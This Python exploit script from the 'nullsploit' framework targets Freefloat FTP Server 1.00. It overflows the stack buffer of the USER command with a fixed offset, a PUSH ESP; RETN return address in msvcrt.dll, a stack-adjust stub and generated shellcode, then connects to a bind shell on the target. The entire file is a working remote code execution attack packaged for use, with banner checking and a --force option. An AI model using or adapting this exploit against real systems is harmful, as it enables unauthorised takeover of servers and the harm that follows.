#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for Freefloat FTP Server

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")

import argparse
import struct
#import subprocess
import shellcode
import tcpexploit
import exploitutils

BANNER                          = "FreeFloat Ftp Server (Version 1.00)" 
TARGETS                         = {
    0 : ['Windows wo/DEP ASLR', struct.pack("<I", 0x77c35459)],
    # PUSH ESP; RETN // 0x77c35459 msvcrt.dll
    1 : ['Debug', struct.pack("<I",0x44444444)]
    }

def main():
    args = arg_parse()

    if args.targets:
        print "Exploit modules targets avaiable:"
        print " =============================== "
        for i in TARGETS:
            print TARGETS[i][0]
        sys.exit()

    if args.port:
        PORT = int(args.port)
    else:
        PORT = int(21)
    if args.payload:
        PAYLOAD = args.payload
    else:
        PAYLOAD = 'win32bind'
    if not args.debug:
        TARGET=TARGETS[0][1]
    else:
        TARGET=TARGETS[1][1]
    if args.rhost:
        HOST = args.rhost
    else:
       print "No target specified"
       sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()

    if args.force:
        run( HOST, PORT, TARGET, PAYLOAD )
        sys.exit()

    checkVulnerability( HOST, PORT )
    run( HOST, PORT, TARGET, PAYLOAD )

def arg_parse():
    parser = argparse.ArgumentParser(add_help=True,
            epilog='Example: exploits/remote/windows/freefloat/freefloat.py --\
rhost 192.168.56.101 --payload win32bind')
    parser.add_argument('--rhost', dest='rhost', help='Target IP / Hostname')
    parser.add_argument('--port', dest='port', help='Target service port')
    parser.add_argument('--payload', dest='payload', help='Shellcode to use')
    parser.add_argument('--force', action='store_true', help='Ignore all checks\
            and send the exploits')
    parser.add_argument('--check', action='store_true', help='Do not exploit\
            vulnerable target')
    parser.add_argument('--debug', action='store_true', help='Crash the target\
            only')
    parser.add_argument('--targets', action='store_true', help='Print available\
            targets')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    args = parser.parse_args()

    return args

def checkVulnerability(HOST, PORT):
    # Check banner for Freefloat 1.0
    response = tcpexploit.bannerchecktest(HOST, PORT, BANNER)
    if response == True:
        print " [+] Target appears vulnerable"
    else:
        print " [-] Target is not vulnerable"
        sys.exit()

def makeSploit( TARGET, PAYLOAD ):
    """
    Construct the attack
    """
    OFFSET=230
    BADCHARS='\x00\x0a\x0d'
    stack = exploitutils.randomstring( OFFSET )
    stack+= TARGET
    stack+= exploitutils.randomstring( 8 )
    stack+= "\x81\xc4\x54\xf2\xff\xff"
    stack+= shellcode.generateshellcode( PAYLOAD, BADCHARS )
    stack+= exploitutils.randomstring( 1000 - len( stack ))
    SPLOITSTRING = "USER " + stack + "\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD ):
    
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD )
    SUCCESS = tcpexploit.exploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        print " [-] Exploit failed!"
        sys.exit()
    print " [+] Retreiving our shell\n"
    exploitutils.handler( HOST, PAYLOAD )

main()
